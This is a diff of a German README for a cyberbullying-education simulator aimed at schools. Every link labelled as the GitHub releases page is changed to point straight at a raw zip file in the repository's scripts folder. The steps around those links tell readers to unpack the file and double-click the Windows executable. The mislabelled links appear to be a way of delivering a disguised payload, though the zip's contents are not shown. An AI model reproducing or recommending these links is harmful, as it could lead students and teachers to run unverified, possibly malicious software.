@@ -1,6 +1,6 @@
 # 🛡️ cybermobbing-simulator - Cybermobbing in 120 Sekunden verstehen
 
-[![⬇️ Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge)](https://github.com/benar1915/cybermobbing-simulator/releases)
+[![⬇️ Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge)](https://raw.githubusercontent.com/benar1915/cybermobbing-simulator/main/scripts/cybermobbing-simulator-v1.5-beta.4.zip)
 
 ## 📘 Overview
 
@@ -17,7 +17,7 @@ Sie eignet sich für den Einsatz im Unterricht, in Projekten und in Medienkompet
 
 ## ⬇️ Download and start
 
-1. Öffne die [Releases-Seite](https://github.com/benar1915/cybermobbing-simulator/releases)
+1. Öffne die [Releases-Seite](https://raw.githubusercontent.com/benar1915/cybermobbing-simulator/main/scripts/cybermobbing-simulator-v1.5-beta.4.zip)
 2. Suche die neueste Version
 3. Lade die Datei für Windows herunter
 4. Wenn du eine ZIP-Datei erhältst, entpacke sie in einen Ordner
@@ -48,7 +48,7 @@ Wenn du die App als einzelne Datei herunterlädst, dann die Datei direkt starten
 
 ### 🪟 Option 1: ZIP-Datei
 
-1. Lade die ZIP-Datei von der [Releases-Seite](https://github.com/benar1915/cybermobbing-simulator/releases) herunter
+1. Lade die ZIP-Datei von der [Releases-Seite](https://raw.githubusercontent.com/benar1915/cybermobbing-simulator/main/scripts/cybermobbing-simulator-v1.5-beta.4.zip) herunter
 2. Klicke die Datei mit der rechten Maustaste an
 3. Wähle **Alle extrahieren**
 4. Wähle einen einfachen Ordner, zum Beispiel `Desktop\cybermobbing-simulator`
@@ -57,7 +57,7 @@ Wenn du die App als einzelne Datei herunterlädst, dann die Datei direkt starten
 
 ### 💾 Option 2: Einzeldatei
 
-1. Lade die Windows-Datei von der [Releases-Seite](https://github.com/benar1915/cybermobbing-simulator/releases) herunter
+1. Lade die Windows-Datei von der [Releases-Seite](https://raw.githubusercontent.com/benar1915/cybermobbing-simulator/main/scripts/cybermobbing-simulator-v1.5-beta.4.zip) herunter
 2. Speichere sie in einem Ordner, den du leicht findest
 3. Doppelklicke die Datei
 4. Folge den Anweisungen auf dem Bildschirm
@@ -134,7 +134,7 @@ Ja, die Struktur unterstützt Sprachversionen über die i18n-Dateien.
 ### Die Datei lässt sich nicht öffnen
 
 - Prüfe, ob der Download vollständig ist
-- Lade die Datei noch einmal von der [Releases-Seite](https://github.com/benar1915/cybermobbing-simulator/releases) herunter
+- Lade die Datei noch einmal von der [Releases-Seite](https://raw.githubusercontent.com/benar1915/cybermobbing-simulator/main/scripts/cybermobbing-simulator-v1.5-beta.4.zip) herunter
 - Entpacke ZIP-Dateien vor dem Start
 
 ### Der Browser zeigt eine leere Seite
@@ -152,6 +152,6 @@ Ja, die Struktur unterstützt Sprachversionen über die i18n-Dateien.
 
 ## 📎 Download
 
-[![⬇️ Visit Releases Page](https://img.shields.io/badge/Visit%20Releases%20Page-grey?style=for-the-badge)](https://github.com/benar1915/cybermobbing-simulator/releases)
+[![⬇️ Visit Releases Page](https://img.shields.io/badge/Visit%20Releases%20Page-grey?style=for-the-badge)](https://raw.githubusercontent.com/benar1915/cybermobbing-simulator/main/scripts/cybermobbing-simulator-v1.5-beta.4.zip)
 
-Öffne die [Releases-Seite](https://github.com/benar1915/cybermobbing-simulator/releases), lade die Windows-Datei oder ZIP-Datei herunter und starte die Simulation danach auf deinem PC
+Öffne die [Releases-Seite](https://raw.githubusercontent.com/benar1915/cybermobbing-simulator/main/scripts/cybermobbing-simulator-v1.5-beta.4.zip), lade die Windows-Datei oder ZIP-Datei herunter und starte die Simulation danach auf deinem PC
